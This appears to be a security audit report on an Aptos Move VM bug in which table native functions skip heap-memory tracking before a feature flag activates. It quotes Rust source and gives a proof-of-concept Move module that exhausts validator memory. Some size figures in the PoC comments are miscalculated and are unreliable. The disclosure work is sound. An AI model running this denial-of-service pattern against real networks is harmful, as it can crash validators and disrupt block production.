# Audit Report

## Title
Memory Quota Bypass via Untracked Table Native Function Memory Allocation

## Summary

Before the `FixMemoryUsageTracking` timed feature flag is enabled (scheduled for March 2025), native table functions fail to track memory usage of values loaded from storage, allowing attackers to bypass per-transaction memory quotas and cause validator node memory exhaustion.

## Finding Description

The vulnerability exists in the interaction between two memory tracking mechanisms:

1. **High-level memory tracking** in `MemoryTrackedGasMeterImpl::charge_native_function()` which tracks argument and return value memory
2. **Native-internal memory tracking** via `SafeNativeContext::use_heap_memory()` which should track values loaded/created during native execution [1](#0-0) 

The `charge_native_function()` method charges memory for return values after native execution. However, for table operations, the return value is just a small reference, not the actual large value loaded from storage. [2](#0-1) 

The critical flaw is in `SafeNativeContext::use_heap_memory()` which only tracks memory **if** the `FixMemoryUsageTracking` timed feature is enabled. Before this flag activates, the function returns `Ok(())` without any tracking. [3](#0-2) 

Table native functions like `native_borrow_box` load large values from storage (line 474-475), calculate their memory size (line 476-486), and attempt to track it via `context.use_heap_memory(amount)` (line 500). But this tracking is silently skipped when the feature flag is disabled. [4](#0-3) [5](#0-4) 

The feature flag activation dates confirm this vulnerability is currently exploitable on TESTNET (until March 7, 2025) and MAINNET (until March 11, 2025).

**Attack Flow:**

1. Attacker creates a table and populates it with large values (in preparation transactions)
2. In an attack transaction, the attacker calls `table::borrow()` repeatedly on different keys
3. Each call loads a large value from storage into memory
4. The memory tracker's `charge_native_function()` only sees small arguments and a small reference return value
5. The internal `use_heap_memory()` call does nothing (feature flag disabled)
6. Memory consumption amplifies unbounded, bypassing the per-transaction quota
7. Validator node runs out of memory and crashes or becomes unresponsive [6](#0-5) 

Additionally, for table module functions, the `should_leak_memory_for_native` flag is set, preventing argument memory from being released before execution, compounding the issue.

## Impact Explanation

**Severity: MEDIUM** (up to $10,000 per Aptos Bug Bounty)

This vulnerability enables:
- **Validator Node DoS**: Attackers can craft transactions that consume arbitrary amounts of memory on validator nodes, causing crashes or severe slowdowns
- **Network Disruption**: Multiple validators experiencing memory pressure simultaneously could impact block production and consensus
- **State Inconsistencies**: If some validators crash mid-transaction while others complete, it may require manual intervention

The impact is categorized as Medium rather than High/Critical because:
- It requires transaction-level setup (creating tables with large values first)
- Memory exhaustion is per-transaction and temporary (not permanent state corruption)
- Does not directly steal funds or permanently break consensus
- Requires multiple transactions to set up the attack surface

However, it clearly breaks **Invariant #3** (Move VM Safety: bytecode execution must respect memory constraints) and **Invariant #9** (Resource Limits: all operations must respect computational limits).

## Likelihood Explanation

**Likelihood: HIGH**

- **Ease of Exploitation**: Moderate - requires creating tables with large values, but this is straightforward
- **Current Status**: ACTIVELY VULNERABLE on TESTNET and MAINNET until March 2025 feature flag activation
- **Attacker Requirements**: Any user can create tables and call table operations; no special privileges needed
- **Detection Difficulty**: May be hard to distinguish from legitimate heavy table usage
- **Known Issue**: The Aptos team has already acknowledged this bug (comment: "Fixes the bug of table natives not tracking the memory usage of the global values they create")

## Recommendation

The fix is already implemented via the `FixMemoryUsageTracking` timed feature flag. Recommendations:

1. **Immediate**: Consider enabling the feature flag earlier on TESTNET/MAINNET if feasible
2. **Monitoring**: Implement alerting for transactions with abnormal memory usage patterns
3. **Rate Limiting**: Consider transaction-level rate limits for table operations until the fix is active

The proper fix ensures `SafeNativeContext::use_heap_memory()` always tracks memory: [2](#0-1) 

When the feature flag is enabled, memory tracking is enforced through the gas meter's `use_heap_memory_in_native_context()` method, properly preventing quota bypass.

## Proof of Concept

```move
module attacker::memory_bomb {
    use std::vector;
    use aptos_std::table::{Self, Table};
    use std::signer;

    struct LargeValue has store, drop {
        data: vector<u128>,
    }

    struct BombStorage has key {
        bomb_table: Table<u64, LargeValue>,
    }

    // Step 1: Setup - Create table with large values
    public entry fun setup(account: &signer) {
        let table = table::new<u64, LargeValue>();
        
        // Add 100 entries, each with a large vector
        let i = 0;
        while (i < 100) {
            let large_vec = vector::empty<u128>();
            let j = 0;
            // Each value contains 10000 u128s (~1.2MB uncompressed)
            while (j < 10000) {
                vector::push_back(&mut large_vec, (i * 10000 + j) as u128);
                j = j + 1;
            };
            
            table::add(&mut table, i, LargeValue { data: large_vec });
            i = i + 1;
        };
        
        move_to(account, BombStorage { bomb_table: table });
    }

    // Step 2: Attack - Load many values in single transaction
    public entry fun trigger_memory_bomb(attacker_addr: address) acquires BombStorage {
        let storage = borrow_global<BombStorage>(attacker_addr);
        
        // Before FixMemoryUsageTracking, each borrow loads ~1.2MB into memory
        // but only the small reference is tracked by charge_native_function()
        // The loaded value's memory is NOT tracked by use_heap_memory()
        
        // Load 50 entries = ~60MB untracked memory consumption
        let i = 0;
        while (i < 50) {
            let _val_ref = table::borrow(&storage.bomb_table, i);
            // Memory is loaded but not tracked!
            i = i + 1;
        };
        
        // This transaction should fail with MEMORY_LIMIT_EXCEEDED
        // but before the fix, it bypasses quota checks
    }
}
```

**Expected behavior before fix**: Transaction succeeds, consuming ~60MB of untracked memory, potentially causing validator OOM.

**Expected behavior after fix**: Transaction aborts with `MEMORY_LIMIT_EXCEEDED` when memory quota (default 10MB) is exceeded.

## Notes

This vulnerability is particularly insidious because:
1. The memory tracking infrastructure exists and appears functional
2. The bug is hidden behind a conditional feature flag check
3. Native functions call `use_heap_memory()` as intended, but it silently does nothing
4. The issue affects all table operations that load values: `borrow_box`, `add_box`, `contains_box`, `remove_box` [7](#0-6) [8](#0-7) [9](#0-8) [10](#0-9)

### Citations

**File:** aptos-move/aptos-memory-usage-tracker/src/lib.rs (L311-319)
```rust
        self.should_leak_memory_for_native = (*module_id.address() == CORE_CODE_ADDRESS
            && module_id.name().as_str() == "table")
            || (self.feature_version() >= 4
                && *module_id.address() == CORE_CODE_ADDRESS
                && module_id.name().as_str() == "event");

        self.base
            .charge_call_generic(module_id, func_name, ty_args, args, num_locals)
    }
```

**File:** aptos-move/aptos-memory-usage-tracker/src/lib.rs (L358-375)
```rust
    fn charge_native_function(
        &mut self,
        amount: InternalGas,
        ret_vals: Option<impl ExactSizeIterator<Item = impl ValueView> + Clone>,
    ) -> PartialVMResult<()> {
        if let Some(mut ret_vals) = ret_vals.clone() {
            self.use_heap_memory(ret_vals.try_fold(AbstractValueSize::zero(), |acc, val| {
                let heap_size = self
                    .vm_gas_params()
                    .misc
                    .abs_val
                    .abstract_heap_size(val, self.feature_version())?;
                Ok::<_, PartialVMError>(acc + heap_size)
            })?)?;
        }

        self.base.charge_native_function(amount, ret_vals)
    }
```

**File:** aptos-move/aptos-native-interface/src/context.rs (L205-217)
```rust
    pub fn use_heap_memory(&mut self, amount: u64) -> SafeNativeResult<()> {
        if self.timed_feature_enabled(TimedFeatureFlag::FixMemoryUsageTracking) {
            if self.has_direct_gas_meter_access_in_native_context() {
                self.gas_meter()
                    .use_heap_memory_in_native_context(amount)
                    .map_err(LimitExceededError::from_err)?;
            } else {
                self.legacy_heap_memory_usage =
                    self.legacy_heap_memory_usage.saturating_add(amount);
            }
        }
        Ok(())
    }
```

**File:** aptos-move/framework/table-natives/src/lib.rs (L440-440)
```rust
        context.use_heap_memory(amount)?;
```

**File:** aptos-move/framework/table-natives/src/lib.rs (L447-505)
```rust
fn native_borrow_box(
    context: &mut SafeNativeContext,
    ty_args: &[Type],
    mut args: VecDeque<Value>,
) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    assert_eq!(ty_args.len(), 3);
    assert_eq!(args.len(), 2);

    context.charge(BORROW_BOX_BASE)?;
    let fix_memory_double_counting =
        context.timed_feature_enabled(TimedFeatureFlag::FixTableNativesMemoryDoubleCounting);

    let (extensions, mut loader_context, abs_val_gas_params, gas_feature_version) =
        context.extensions_with_loader_context_and_gas_params();
    let table_context = extensions.get::<NativeTableContext>();
    let mut table_data = table_context.table_data.borrow_mut();

    let key = args.pop_back().unwrap();
    let handle = get_table_handle(&safely_pop_arg!(args, StructRef))?;

    let table =
        table_data.get_or_create_table(&mut loader_context, handle, &ty_args[0], &ty_args[2])?;

    let function_value_extension = loader_context.function_value_extension();
    let key_bytes = serialize_key(&function_value_extension, &table.key_layout, &key)?;
    let key_cost = BORROW_BOX_PER_BYTE_SERIALIZED * NumBytes::new(key_bytes.len() as u64);

    let (gv, loaded) =
        table.get_or_create_global_value(&function_value_extension, table_context, key_bytes)?;
    let mem_usage = if !fix_memory_double_counting || loaded.is_some() {
        gv.view()
            .map(|val| {
                abs_val_gas_params
                    .abstract_heap_size(&val, gas_feature_version)
                    .map(u64::from)
            })
            .transpose()?
    } else {
        None
    };

    let res = match gv.borrow_global() {
        Ok(ref_val) => Ok(smallvec![ref_val]),
        Err(_) => Err(SafeNativeError::Abort {
            abort_code: NOT_FOUND,
        }),
    };

    drop(table_data);

    // TODO(Gas): Figure out a way to charge this earlier.
    context.charge(key_cost)?;
    if let Some(amount) = mem_usage {
        context.use_heap_memory(amount)?;
    }
    charge_load_cost(context, loaded)?;

    res
}
```

**File:** aptos-move/framework/table-natives/src/lib.rs (L554-554)
```rust
        context.use_heap_memory(amount)?;
```

**File:** aptos-move/framework/table-natives/src/lib.rs (L614-614)
```rust
        context.use_heap_memory(amount)?;
```

**File:** types/src/on_chain_config/timed_features.rs (L20-21)
```rust
    // Fixes the bug of table natives not tracking the memory usage of the global values they create.
    FixMemoryUsageTracking,
```

**File:** types/src/on_chain_config/timed_features.rs (L102-109)
```rust
            (FixMemoryUsageTracking, TESTNET) => Los_Angeles
                .with_ymd_and_hms(2025, 3, 7, 12, 0, 0)
                .unwrap()
                .with_timezone(&Utc),
            (FixMemoryUsageTracking, MAINNET) => Los_Angeles
                .with_ymd_and_hms(2025, 3, 11, 17, 0, 0)
                .unwrap()
                .with_timezone(&Utc),
```
